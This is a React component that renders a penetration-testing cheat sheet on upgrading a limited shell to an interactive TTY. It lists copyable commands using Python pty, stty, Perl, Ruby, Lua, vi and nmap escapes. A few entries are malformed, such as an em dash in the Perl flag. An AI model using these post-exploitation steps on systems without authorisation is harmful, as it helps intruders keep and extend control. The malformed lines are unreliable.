import React from 'react';
import { Typography, Divider } from 'antd';
import QueueAnim from 'rc-queue-anim';

const { Title, Paragraph, Text } = Typography;

export default function TTY () {
    return (
        <QueueAnim delay={300} duration={1500}>
            <Title level={2} style={{ fontWeight: 'bold', margin: 15 }}>
                TTY Spawn Shell
            </Title>
            <Paragraph style={{ margin: 15 }}>
                Often during pen tests you may obtain a shell without having tty, yet wish to interact further with the
                system. Here are some commands which will allow you to spawn a tty shell. Obviously some of this will
                depend on the system environment and installed packages.
            </Paragraph>
            <div
                key='a'
                style={{
                    padding: 15,
                    marginTop: 15
                }}
            >
                <Title level={3}>Python spawn shell </Title>
                <Paragraph>
                    <pre><Text copyable>python -c 'import pty; pty.spawn("/bin/bash")'</Text></pre>
                </Paragraph>
            </div>
            <Divider orientation='center'>Fully Interactive TTY</Divider>
            <div
                key='b'
                style={{
                    padding: 15,
                    marginTop: 15
                }}
            >
                <Title level={4}>All the steps to stabilize your shell</Title>
                <Paragraph>
                    <strong>The first step:</strong>
                    <pre>
                        <Paragraph style={{ margin: 0 }}>
                            python3 -c 'import pty;pty.spawn("/bin/bash")'
                        </Paragraph>
                    </pre>
                    Which uses Python to spawn a better-featured bash shell. At this point, our shell will look a bit
                    prettier, but we still won’t be able to use tab autocomplete or the arrow keys.
                </Paragraph>
                <br />
                <Paragraph>
                    <strong>Step two is:</strong>
                    <pre>
                        <Paragraph style={{ margin: 0 }} copyable>
                            export TERM=xterm
                        </Paragraph>
                    </pre>
                    This will give us access to term commands such as clear.
                </Paragraph>
                <br />
                <Paragraph>
                    <strong>Finally (and most importantly) we will background the shell using</strong>
                    <pre>
                        <Paragraph style={{ margin: 0 }} copyable>
                            Ctrl + Z
                        </Paragraph>
                    </pre>
                    Back in our own terminal we use
                    <pre>
                        <Paragraph style={{ margin: 0 }} copyable>
                            stty raw -echo; fg
                        </Paragraph>
                    </pre>
                    This does two things: first, it turns off our own terminal echo which gives us access to tab
                    autocompletes, the arrow keys, and Ctrl + C to kill processes
                </Paragraph>
                <Paragraph>
                    <pre>
                        <Paragraph style={{ margin: 0 }} copyable>
                            stty rows 38 columns 116
                        </Paragraph>
                    </pre>
                </Paragraph>
            </div>
            <Divider />
            <div
                key='c'
                style={{
                    padding: 15,
                    marginTop: 15
                }}
            >
                <Title level={3}>OS system spawn shell</Title>
                <Paragraph>
                    <pre><Text copyable>echo os.system("/bin/bash")</Text></pre>
                </Paragraph>
            </div>
            <div
                key='d'
                style={{
                    padding: 15,
                    marginTop: 15
                }}
            >
                <Title level={3}>Bash spawn shell </Title>
                <Paragraph>
                    <pre><Text copyable>/bin/sh -i</Text></pre>
                </Paragraph>
            </div>
            <div
                key='e'
                style={{
                    padding: 15,
                    marginTop: 15
                }}
            >
                <Title level={3}>Perl spawn shell </Title>
                <Paragraph>
                    <pre><Text copyable>perl —e 'exec "/bin/sh";'</Text></pre>
                </Paragraph>
            </div>
            <div
                key='f'
                style={{
                    padding: 15,
                    marginTop: 15
                }}
            >
                <Title level={3}>Ruby spawn shell </Title>
                <Paragraph>
                    <pre><Text copyable>ruby: exec "/bin/sh"</Text></pre>
                </Paragraph>
            </div>
            <div
                key='g'
                style={{
                    padding: 15,
                    marginTop: 15
                }}
            >
                <Title level={3}>Lua spawn shell </Title>
                <Paragraph>
                    <pre><Text copyable>lua: os.execute("/bin/sh")</Text></pre>
                </Paragraph>
            </div>
            <div
                key='h'
                style={{
                    padding: 15,
                    marginTop: 15
                }}
            >
                <Title level={3}>IRB spawn shell </Title>
                <Paragraph>
                    <pre><Text copyable>exec "/bin/sh"</Text></pre>
                </Paragraph>
            </div>
            <div
                key='i'
                style={{
                    padding: 15,
                    marginTop: 15
                }}
            >
                <Title level={3}>VI spawn shell </Title>
                <Paragraph>
                    <pre><Text copyable>:!bash</Text></pre>
                </Paragraph>
            </div>
            <div
                key='j'
                style={{
                    padding: 15,
                    marginTop: 15
                }}
            >
                <Title level={3}>VI(2) spawn shell </Title>
                <Paragraph>
                    <pre><Text copyable>:set shell=/bin/bash:shell</Text></pre>
                </Paragraph>
            </div>
            <div
                key='k'
                style={{
                    padding: 15,
                    marginTop: 15
                }}
            >
                <Title level={3}>Nmap spawn shell </Title>
                <Paragraph>
                    <pre><Text copyable>!sh</Text></pre>
                </Paragraph>
            </div>
        </QueueAnim>
    );
}
